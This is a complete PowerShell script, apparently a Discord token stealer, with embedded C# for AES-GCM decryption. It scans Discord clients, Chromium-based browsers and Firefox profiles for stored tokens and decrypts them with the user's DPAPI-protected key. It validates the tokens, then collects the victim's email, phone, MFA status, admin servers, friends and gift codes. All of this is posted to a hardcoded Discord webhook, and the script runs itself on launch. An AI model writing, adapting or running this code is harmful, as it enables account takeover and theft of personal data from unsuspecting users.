#region C# Code for AES-GCM Decryption
Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;
using System.Text;

public class AesGcmDecryptor
{
    [StructLayout(LayoutKind.Sequential)]
    public struct BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO
    {
        public int cbSize;
        public int dwInfoVersion;
        public IntPtr pbNonce;
        public int cbNonce;
        public IntPtr pbAuthData;
        public int cbAuthData;
        public IntPtr pbTag;
        public int cbTag;
        public IntPtr pbMacContext;
        public int cbMacContext;
        public int cbAAD;
        public ulong cbData;
        public int dwFlags;

        public static BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO Create()
        {
            var info = new BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO();
            info.cbSize = Marshal.SizeOf(typeof(BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO));
            info.dwInfoVersion = 1;
            return info;
        }
    }

    [DllImport("bcrypt.dll", CharSet = CharSet.Unicode)]
    public static extern int BCryptOpenAlgorithmProvider(out IntPtr phAlgorithm, string pszAlgId, string pszImplementation, int dwFlags);

    [DllImport("bcrypt.dll")]
    public static extern int BCryptCloseAlgorithmProvider(IntPtr hAlgorithm, int dwFlags);

    [DllImport("bcrypt.dll", CharSet = CharSet.Unicode)]
    public static extern int BCryptSetProperty(IntPtr hObject, string pszProperty, byte[] pbInput, int cbInput, int dwFlags);

    [DllImport("bcrypt.dll")]
    public static extern int BCryptGenerateSymmetricKey(IntPtr hAlgorithm, out IntPtr phKey, IntPtr pbKeyObject, int cbKeyObject, byte[] pbSecret, int cbSecret, int dwFlags);

    [DllImport("bcrypt.dll")]
    public static extern int BCryptDestroyKey(IntPtr hKey);

    [DllImport("bcrypt.dll")]
    public static extern int BCryptDecrypt(
        IntPtr hKey,
        byte[] pbInput,
        int cbInput,
        ref BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO pPaddingInfo,
        byte[] pbIV,
        int cbIV,
        byte[] pbOutput,
        int cbOutput,
        out int pcbResult,
        int dwFlags
    );

    public static string Decrypt(byte[] key, byte[] iv, byte[] ciphertext, byte[] tag)
    {
        IntPtr hAlgorithm = IntPtr.Zero;
        IntPtr hKey = IntPtr.Zero;
        int result;
        byte[] decrypted = null;

        try
        {
            result = BCryptOpenAlgorithmProvider(out hAlgorithm, "AES", null, 0);
            if (result != 0) throw new Exception(string.Format("BCryptOpenAlgorithmProvider failed (0x{0:X8})", result));

            byte[] chainMode = Encoding.Unicode.GetBytes("ChainingModeGCM\0");
            result = BCryptSetProperty(hAlgorithm, "ChainingMode", chainMode, chainMode.Length, 0);
            if (result != 0) throw new Exception(string.Format("BCryptSetProperty failed (0x{0:X8})", result));

            result = BCryptGenerateSymmetricKey(hAlgorithm, out hKey, IntPtr.Zero, 0, key, key.Length, 0);
            if (result != 0) throw new Exception(string.Format("BCryptGenerateSymmetricKey failed (0x{0:X8})", result));

            var authInfo = BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO.Create();
            authInfo.pbNonce = Marshal.AllocHGlobal(iv.Length);
            Marshal.Copy(iv, 0, authInfo.pbNonce, iv.Length);
            authInfo.cbNonce = iv.Length;

            authInfo.pbTag = Marshal.AllocHGlobal(tag.Length);
            Marshal.Copy(tag, 0, authInfo.pbTag, tag.Length);
            authInfo.cbTag = tag.Length;

            decrypted = new byte[ciphertext.Length];
            int decryptedLength;

            result = BCryptDecrypt(
                hKey,
                ciphertext,
                ciphertext.Length,
                ref authInfo,
                null,
                0,
                decrypted,
                decrypted.Length,
                out decryptedLength,
                0
            );

            if (result != 0) throw new Exception(string.Format("BCryptDecrypt failed (0x{0:X8})", result));

            return Encoding.UTF8.GetString(decrypted, 0, decryptedLength);
        }
        finally
        {
            if (hKey != IntPtr.Zero) BCryptDestroyKey(hKey);
            if (hAlgorithm != IntPtr.Zero) BCryptCloseAlgorithmProvider(hAlgorithm, 0);
        }
    }
}
'@ -ReferencedAssemblies System.Security
#endregion

#region Discord Token Extraction
# --- Helper function: add token if not already present ---
function Add-Token {
    param (
        [string]$token
    )
    if ($global:FoundTokens -notcontains $token) {
        $global:FoundTokens += $token
    }
}

# --- Function: Search-InFile ---
function Search-InFile {
    param (
        [Parameter(Mandatory=$true)]
        [string]$FilePath
    )
    try {
        $content = Get-Content -Path $FilePath -Raw -ErrorAction Stop
    }
    catch {
        return
    }

    # Process plaintext tokens
    $plainMatches = [regex]::Matches($content, $tokenRegex)
    foreach ($match in $plainMatches) {
        Add-Token $match.Value
    }

    # Process encrypted tokens
    $encryptedMatches = [regex]::Matches($content, $encryptedRegex)
    foreach ($match in $encryptedMatches) {
        $parts = $match.Value -split 'dQw4w9WgXcQ:'
        if ($parts.Length -lt 2) { continue }
        $b64data = $parts[1]
        try {
            $decoded = [System.Convert]::FromBase64String($b64data)
        }
        catch {
            continue
        }
        if ($decoded.Length -lt (15 + 16)) { continue }

        # Extract components:
        $iv = $decoded[3..14]                           # bytes 3-14: 12-byte IV
        $tag = $decoded[($decoded.Length - 16)..($decoded.Length - 1)]  # last 16 bytes: tag
        $ciphertext = $decoded[15..($decoded.Length - 17)]  # bytes between IV and tag

        # Determine the application folder from the file path (Discord-based apps)
        if ($FilePath -match '\\\\(discord|discordcanary|discordptb|lightcord)\\\\') {
            if ($FilePath -match '\\\\discordcanary\\\\') {
                $appName = 'discordcanary'
            } elseif ($FilePath -match '\\\\discordptb\\\\') {
                $appName = 'discordptb'
            } elseif ($FilePath -match '\\\\lightcord\\\\') {
                $appName = 'lightcord'
            } else {
                $appName = 'discord'
            }
            $localStatePath = Join-Path $env:APPDATA '$appName\Local State'
            if (-not (Test-Path $localStatePath)) { continue }
            try {
                $localStateContent = Get-Content -Path $localStatePath -Raw -ErrorAction Stop
                $localState = $localStateContent | ConvertFrom-Json
            }
            catch {
                continue
            }
            $encryptedKeyBase64 = $localState.os_crypt.encrypted_key
            try {
                $encryptedKeyBytes = [System.Convert]::FromBase64String($encryptedKeyBase64)
            }
            catch {
                continue
            }
            if ($encryptedKeyBytes.Length -lt 5) { continue }
            # Remove the 'DPAPI' prefix (first 5 bytes)
            $encryptedKeyBytes = $encryptedKeyBytes[5..($encryptedKeyBytes.Length - 1)]
            try {
                $masterKey = [System.Security.Cryptography.ProtectedData]::Unprotect(
                                $encryptedKeyBytes, 
                                $null, 
                                [System.Security.Cryptography.DataProtectionScope]::CurrentUser
                             )
            }
            catch {
                continue
            }
        }
        else {
            continue
        }

        try {
            $decryptedToken = [AesGcmDecryptor]::Decrypt($masterKey, $iv, $ciphertext, $tag)
        }
        catch {
            continue
        }
        if ($decryptedToken -match $tokenRegex) {
            Add-Token $decryptedToken
        }
    }
}

# --- Function: Search-Directory (recursive file search) ---
function Search-Directory {
    param (
        [Parameter(Mandatory=$true)]
        [string]$DirectoryPath
    )
    if (-not (Test-Path $DirectoryPath)) { return }
    try {
        $files = Get-ChildItem -Path $DirectoryPath -Recurse -Include *.log,*.ldb -ErrorAction SilentlyContinue
    }
    catch {
        return
    }
    foreach ($file in $files) {
        Search-InFile -FilePath $file.FullName
    }
}

# --- Function: Validate-Token ---
function Validate-Token {
    param (
        [Parameter(Mandatory=$true)]
        [string]$Token
    )
    $url = 'https://discord.com/api/v9/users/@me'
    try {
        # Use Invoke-WebRequest with basic parsing enabled
        $ProgressPreference = 'SilentlyContinue'
        $response = Invoke-WebRequest -Uri $url -Headers @{ 'Authorization' = $Token } -Method GET -UseBasicParsing -ErrorAction Stop
        if ($response.StatusCode -eq 200) {
            return $true
        }
        else {
            return $false
        }
    }
    catch {
        return $false
    }
}

function Get-TokenInfo {
    [CmdletBinding()]
    param(
        # Provide a Discord token string.
        [Parameter(Mandatory = $true)]
        [string]$Token
    )

    # --- Get basic user info ---
    try {
        $userInfo = Invoke-RestMethod -Uri 'https://discord.com/api/v9/users/@me' `
                                      -Headers @{ Authorization = $Token } `
                                      -Method Get -ErrorAction Stop
    }
    catch {
        Write-Error 'Failed to retrieve user info. The token may be invalid.'
        return $null
    }

    # --- Helper: Determine Nitro type based on premium_type ---
    function Get-NitroType {
        param([int]$premiumType)
        switch ($premiumType) {
            1 { return 'Nitro Classic' }
            2 { return 'Nitro' }
            3 { return 'Nitro Basic' }
            default { return 'None' }
        }
    }
    $nitroType = Get-NitroType -premiumType $userInfo.premium_type

    # --- Helper: Construct the avatar URL (prefers GIF if available) ---
    function Get-AvatarURL {
        param($user)
        if ([string]::IsNullOrEmpty($user.avatar)) {
            return ''
        }
        $baseUrl = 'https://cdn.discordapp.com/avatars/$($user.id)/$($user.avatar)'
        $gifUrl = '$baseUrl.gif'
        try {
            $headResp = Invoke-WebRequest -Uri $gifUrl -Method Head -ErrorAction Stop
            if ($headResp.StatusCode -eq 200) {
                return $gifUrl
            }
        }
        catch {
            # If the HEAD request fails, fall back to PNG.
        }
        return '$baseUrl.png'
    }
    $avatarUrl = Get-AvatarURL -user $userInfo

    # --- Helper: Calculate badge emojis based on public_flags ---
    function Get-Badges {
        param([int]$flags)
        $badges = @()
        $mapping = @(
            @{ Name = 'DISCORD_EMPLOYEE';       Emoji = '<:staff:968704541946167357>';       Shift = 0 },
            @{ Name = 'DISCORD_PARTNER';        Emoji = '<:partner:968704542021652560>';      Shift = 1 },
            @{ Name = 'HYPESQUAD_EVENTS';       Emoji = '<:hypersquad_events:968704541774192693>'; Shift = 2 },
            @{ Name = 'BUG_HUNTER_LEVEL_1';     Emoji = '<:bug_hunter_1:968704541677723648>';    Shift = 3 },
            @{ Name = 'HOUSE_BRAVERY';          Emoji = '<:hypersquad_1:968704541501571133>';     Shift = 6 },
            @{ Name = 'HOUSE_BRILLIANCE';       Emoji = '<:hypersquad_2:968704541883261018>';     Shift = 7 },
            @{ Name = 'HOUSE_BALANCE';          Emoji = '<:hypersquad_3:968704541874860082>';     Shift = 8 },
            @{ Name = 'EARLY_SUPPORTER';        Emoji = '<:early_supporter:968704542126510090>';  Shift = 9 },
            @{ Name = 'BUG_HUNTER_LEVEL_2';     Emoji = '<:bug_hunter_2:968704541774217246>';    Shift = 14 },
            @{ Name = 'VERIFIED_BOT_DEVELOPER'; Emoji = '<:verified_dev:968704541702905886>';     Shift = 17 },
            @{ Name = 'ACTIVE_DEVELOPER';       Emoji = '<:Active_Dev:1045024909690163210>';      Shift = 22 },
            @{ Name = 'CERTIFIED_MODERATOR';    Emoji = '<:certified_moderator:988996447938674699>'; Shift = 18 },
            @{ Name = 'SPAMMER';                Emoji = '⌨';                                    Shift = 20 }
        )
        foreach ($item in $mapping) {
            if (($flags -band (1 -shl $item.Shift)) -ne 0) {
                $badges += $item.Emoji
            }
        }
        return $badges -join ' '
    }
    $badges = Get-Badges -flags $userInfo.public_flags

    # --- Helper: Get HQ Guilds ---
    function Get-HQGuilds {
        param([string]$authToken)
        $guildsUrl = 'https://discord.com/api/v9/users/@me/guilds?with_counts=true'
        try {
            $guilds = Invoke-RestMethod -Uri $guildsUrl -Headers @{ Authorization = $authToken } -Method Get -ErrorAction Stop
        }
        catch {
            return ''
        }
        $lines = @()
        foreach ($guild in $guilds) {
            # Skip guilds if the bot-like permission (0x8) isn't present or the member count is too low.
            $permissions = 0
            if ([long]::TryParse($guild.permissions, [ref] $permissions)) {
                if (($permissions -band 0x8) -eq 0) { continue }
            }
            if ($guild.approximate_member_count -lt 100) { continue }
            # Attempt to get an invite link; if none, use a fallback.
            $inviteUrl = 'https://discord.com/api/v8/guilds/$($guild.id)/invites'
            try {
                $inviteResponse = Invoke-RestMethod -Uri $inviteUrl -Headers @{ Authorization = $authToken } -Method Get -ErrorAction Stop
                if ($inviteResponse.Count -gt 0) {
                    $inviteCode = $inviteResponse[0].code
                    $inviteLink = 'https://discord.gg/$inviteCode'
                }
                else {
                    $inviteLink = 'https://youtu.be/dQw4w9WgXcQ'
                }
            }
            catch {
                $inviteLink = 'https://youtu.be/dQw4w9WgXcQ'
            }
            $line = '**$($guild.name) ($($guild.id))** - Members: $($guild.approximate_member_count), Invite: $inviteLink'
            $lines += $line
            if (($lines -join '`n').Length -ge 1024) { break }
        }
        return $lines -join '`n'
    }
    $hqGuilds = Get-HQGuilds -authToken $Token

    # --- Helper: Get HQ Friends (relationships with badge info) ---
    function Get-HQFriends {
        param([string]$authToken)
        $friendsUrl = 'https://discord.com/api/v8/users/@me/relationships'
        try {
            $friends = Invoke-RestMethod -Uri $friendsUrl -Headers @{ Authorization = $authToken } -Method Get -ErrorAction Stop
        }
        catch {
            return ''
        }
        $lines = @()
        foreach ($friend in $friends) {
            if ($friend.user) {
                $friendBadges = Get-Badges $friend.user.public_flags
                if (-not [string]::IsNullOrEmpty($friendBadges)) {
                    $line = '$friendBadges - $($friend.user.username)#$($friend.user.discriminator) ($($friend.user.id))'
                    $lines += $line
                }
            }
            if (($lines -join '`n').Length -ge 1024) { break }
        }
        return $lines -join '`n'
    }
    $hqFriends = Get-HQFriends -authToken $Token

    # --- Helper: Get Gift Codes ---
    function Get-GiftCodes {
        param([string]$authToken)
        $giftUrl = 'https://discord.com/api/v9/users/@me/outbound-promotions/codes'
        try {
            $codes = Invoke-RestMethod -Uri $giftUrl -Headers @{ Authorization = $authToken } -Method Get -ErrorAction Stop
        }
        catch {
            return ''
        }
        $lines = @()
        foreach ($code in $codes) {
            $line = ':gift: ``$($code.promotion.outbound_title)`` - :ticket: ``$($code.code)``'
            $lines += $line
            if (($lines -join '`n').Length -ge 1024) { break }
        }
        return $lines -join '`n`n'
    }
    $giftCodes = Get-GiftCodes -authToken $Token

    # --- Billing information is not retrieved in this example; default to 'None' ---
    $billing = 'None'

    # --- Build the Token Info object ---
    $tokenInfo = [PSCustomObject]@{
        Username  = '$($userInfo.username)#$($userInfo.discriminator)'
        Token     = $Token
        Nitro     = $nitroType
        Billing   = $billing
        MFA       = $userInfo.mfa_enabled
        Email     = $userInfo.email
        Phone     = $userInfo.phone
        Avatar    = $avatarUrl
        HQGuilds  = $hqGuilds
        HQFriends = $hqFriends
        GiftCodes = $giftCodes
        Badges    = $badges
    }

    return $tokenInfo
}

function Get-DiscordTokens{
    # --- Global regex patterns and token storage ---
    $tokenRegex     = '[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}'
    $encryptedRegex = 'dQw4w9WgXcQ:[^']*'
    $global:FoundTokens = @()

    # --- Define base paths (using APPDATA and LOCALAPPDATA) ---
    $roaming = $env:APPDATA
    $local   = $env:LOCALAPPDATA

    # Hashtable of directories to search (Discord variants and browsers)
    $paths = @{
        'Discord'              = Join-Path $roaming 'discord\Local Storage\leveldb'
        'Discord Canary'       = Join-Path $roaming 'discordcanary\Local Storage\leveldb'
        'Lightcord'            = Join-Path $roaming 'Lightcord\Local Storage\leveldb'
        'Discord PTB'          = Join-Path $roaming 'discordptb\Local Storage\leveldb'
        'Opera'                = Join-Path $roaming 'Opera Software\Opera Stable\Local Storage\leveldb'
        'Opera GX'             = Join-Path $roaming 'Opera Software\Opera GX Stable\Local Storage\leveldb'
        'Amigo'                = Join-Path $local   'Amigo\User Data\Local Storage\leveldb'
        'Torch'                = Join-Path $local   'Torch\User Data\Local Storage\leveldb'
        'Kometa'               = Join-Path $local   'Kometa\User Data\Local Storage\leveldb'
        'Orbitum'              = Join-Path $local   'Orbitum\User Data\Local Storage\leveldb'
        'CentBrowser'          = Join-Path $local   'CentBrowser\User Data\Local Storage\leveldb'
        '7Star'                = Join-Path $local   '7Star\7Star\User Data\Local Storage\leveldb'
        'Sputnik'              = Join-Path $local   'Sputnik\Sputnik\User Data\Local Storage\leveldb'
        'Vivaldi'              = Join-Path $local   'Vivaldi\User Data\Default\Local Storage\leveldb'
        'Chrome SxS'           = Join-Path $local   'Google\Chrome SxS\User Data\Local Storage\leveldb'
        'Chrome'               = Join-Path $local   'Google\Chrome\User Data\Default\Local Storage\leveldb'
        'Chrome1'              = Join-Path $local   'Google\Chrome\User Data\Profile 1\Local Storage\leveldb'
        'Chrome2'              = Join-Path $local   'Google\Chrome\User Data\Profile 2\Local Storage\leveldb'
        'Chrome3'              = Join-Path $local   'Google\Chrome\User Data\Profile 3\Local Storage\leveldb'
        'Chrome4'              = Join-Path $local   'Google\Chrome\User Data\Profile 4\Local Storage\leveldb'
        'Chrome5'              = Join-Path $local   'Google\Chrome\User Data\Profile 5\Local Storage\leveldb'
        'Epic Privacy Browser' = Join-Path $local   'Epic Privacy Browser\User Data\Local Storage\leveldb'
        'Microsoft Edge'       = Join-Path $local   'Microsoft\Edge\User Data\Default\Local Storage\leveldb'
        'Uran'                 = Join-Path $local   'uCozMedia\Uran\User Data\Local Storage\leveldb'
        'Yandex'               = Join-Path $local   'Yandex\YandexBrowser\User Data\Local Storage\leveldb'
        'Brave'                = Join-Path $local   'BraveSoftware\Brave-Browser\User Data\Local Storage\leveldb'
        'Iridium'              = Join-Path $local   'Iridium\User Data\Default\Local Storage\leveldb'
        'Chromium'             = Join-Path $local 'Chromium\User Data\Default\Local Storage\leveldb'
    }

    # --- Loop through directories and search for tokens ---
    foreach ($name in $paths.Keys) {
        $dirPath = $paths[$name]
        if (Test-Path $dirPath) {
            Search-Directory -DirectoryPath $dirPath
        }
    }

    # Additionally, search Firefox profiles
    $firefoxProfilesPath = Join-Path $roaming 'Mozilla\Firefox\Profiles'
    if (Test-Path $firefoxProfilesPath) {
        try {
            $ffFiles = Get-ChildItem -Path $firefoxProfilesPath -Recurse -Include *.sqlite -ErrorAction SilentlyContinue
        }
        catch {
            $ffFiles = @()
        }
        foreach ($file in $ffFiles) {
            Search-InFile -FilePath $file.FullName
        }
    }

    # --- Loop through all extracted tokens and check if they are valid ---
    $ValidTokens = @()
    foreach ($token in $global:FoundTokens) {
        if (Validate-Token -Token $token) {
            $ValidTokens += $token
        }
        else {
        }
    }

    # --- Output the valid tokens ---
    if ($ValidTokens.Count -gt 0) {
        return $ValidTokens
    }
    else {
        return $null
    }
}
#endregion

#region Discord Sending
function Send-DiscordEmbed {
    param(
        [Parameter(Mandatory=$true)]
        [hashtable]$Embed,
        [string]$webhookUrl,
        [string]$username,
        [string]$avatar_url
    )

    $payload = @{
        username = $username
        avatar_url = $avatar_url
        embeds = @($Embed)
    }

    $payloadJson = $payload | ConvertTo-Json -Depth 10 -Compress 
    try {
        $response = Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payloadJson -ContentType 'application/json; charset=utf-8'
    }
    catch {
        Write-Error 'Failed to send Discord embed: $_'
    }
}

function Create-TokenEmbed {
    [CmdletBinding()]
    param(
        # $TokenInfo should be an object or hashtable with the following properties:
        # Username, Token, Nitro, Billing, MFA, Email, Phone, Avatar, HQGuilds, HQFriends, GiftCodes, Badges
        [Parameter(Mandatory = $true)]
        $TokenInfo
    )

    # Helper function: returns 'None' if the input string is empty.
    function Format-Value {
        param([string]$s)
        if ([string]::IsNullOrEmpty($s)) {
            return 'None'
        }
        return $s
    }

    # Determine MFA status as a string.
    $mfaStatus = 'False'
    if ($TokenInfo.MFA -eq $true) {
        $mfaStatus = 'True'
    }

    # Build an array of embed fields.
    $fields = @()

    # Field 1: Token (displayed as a code block)
    $fields += @{
        name   = '<a:pinkcrown:996004209667346442> Token:'
        value  = '``````$($TokenInfo.Token)``````'
        inline = $false
    }

    # Field 2: Nitro
    $fields += @{
        name   = '<a:nitroboost:996004213354139658> Nitro:'
        value  = $TokenInfo.Nitro
        inline = $true
    }

    # Field 3: Badges (use Format-Value to substitute empty strings)
    $fields += @{
        name   = '<a:redboost:996004230345281546> Badges:'
        value  = (Format-Value $TokenInfo.Badges)
        inline = $true
    }

    # Field 4: Billing
    $fields += @{
        name   = '<a:pinklv:996004222090891366> Billing:'
        value  = (Format-Value $TokenInfo.Billing)
        inline = $true
    }

    # Field 5: MFA
    $fields += @{
        name   = '<:mfa:1021604916537602088> MFA:'
        value  = $mfaStatus
        inline = $true
    }

    # Field 6: Spacer (using a zero-width space character)
    $fields += @{
        name   = [char]0x200b
        value  = [char]0x200b
        inline = $false
    }

    # Field 7: Email
    $fields += @{
        name   = '<a:rainbowheart:996004226092245072> Email:'
        value  = (Format-Value $TokenInfo.Email)
        inline = $true
    }

    # Field 8: Phone
    $fields += @{
        name   = '<:starxglow:996004217699434496> Phone:'
        value  = (Format-Value $TokenInfo.Phone)
        inline = $true
    }

    # Field 9: Spacer
    $fields += @{
        name   = [char]0x200b
        value  = [char]0x200b
        inline = $false
    }

    # If HQGuilds is not empty, add a field for it and another spacer.
    if (-not [string]::IsNullOrEmpty($TokenInfo.HQGuilds)) {
        $fields += @{
            name   = '<a:earthpink:996004236531859588> HQ Guilds:'
            value  = $TokenInfo.HQGuilds
            inline = $false
        }
        $fields += @{
            name   = [char]0x200b
            value  = [char]0x200b
            inline = $false
        }
    }

    # If HQFriends is not empty, add a field for it and a spacer.
    if (-not [string]::IsNullOrEmpty($TokenInfo.HQFriends)) {
        $fields += @{
            name   = '<a:earthpink:996004236531859588> HQ Friends:'
            value  = $TokenInfo.HQFriends
            inline = $false
        }
        $fields += @{
            name   = [char]0x200b
            value  = [char]0x200b
            inline = $false
        }
    }

    # If GiftCodes is not empty, add a field for it and a spacer.
    if (-not [string]::IsNullOrEmpty($TokenInfo.GiftCodes)) {
        $fields += @{
            name   = '<a:gift:1021608479808569435> Gift Codes:'
            value  = $TokenInfo.GiftCodes
            inline = $false
        }
        $fields += @{
            name   = '\u200b'
            value  = '\u200b'
            inline = $false
        }
    }

    # Build the final Discord embed as a hashtable.
    $embed = @{
        title     = $TokenInfo.Username
        color     = 0x3498db
        thumbnail = @{ url = $TokenInfo.Avatar }
        fields    = $fields
        footer    = @{ text = 'Token info gathered' }
        timestamp = [System.DateTime]::UtcNow.ToString('yyyy-MM-ddTHH:mm:ss.fffZ')
    }

    return $embed
}
#endregion

#region Main function
Function Main {
    $webhookUrl = 'https://discord.com/api/webhooks/1386838200089182319/DFvenBNwWaKMzXWX-HfhQy6IkkuGCo4yAcGKuTDs_IYpvrlWrXv0bnIyUNiV2GwYLvju'
    
    # --- username and pfp ---
    $username = 'PowerShell'
    $avatar_url = 'https://i.imgur.com/8NQTxD8.png'

    # --- get the discord tokens ---
    try {
        $tokens = Get-DiscordTokens
        if ($tokens) {
            foreach ($token in $tokens) {
                $tokenInfo = Get-TokenInfo -Token $token
                $embed = Create-TokenEmbed -TokenInfo $tokenInfo
                Send-DiscordEmbed -Embed $embed -webhookUrl $webhookUrl -username $username -avatar_url $avatar_url
            }
        }
        else {
            # Send fail message when no tokens are found
            $failEmbed = @{
                title = '❌ Token Extraction Failed'
                description = 'No Discord tokens were found on this system.'
                color = 0xff0000
                footer = @{ text = 'Token extraction completed' }
                timestamp = [System.DateTime]::UtcNow.ToString('yyyy-MM-ddTHH:mm:ss.fffZ')
            }
            Send-DiscordEmbed -Embed $failEmbed -webhookUrl $webhookUrl -username $username -avatar_url $avatar_url
        }
    }
    catch {
        # Send fail message when an error occurs
        $errorEmbed = @{
            title = '❌ Token Extraction Error'
            description = 'An error occurred during token extraction: $($_.Exception.Message)'
            color = 0xff0000
            footer = @{ text = 'Token extraction failed' }
            timestamp = [System.DateTime]::UtcNow.ToString('yyyy-MM-ddTHH:mm:ss.fffZ')
        }
        Send-DiscordEmbed -Embed $errorEmbed -webhookUrl $webhookUrl -username $username -avatar_url $avatar_url
        Write-Error 'Failed to extract Discord tokens: $_'
    }
}
#endregion

Main
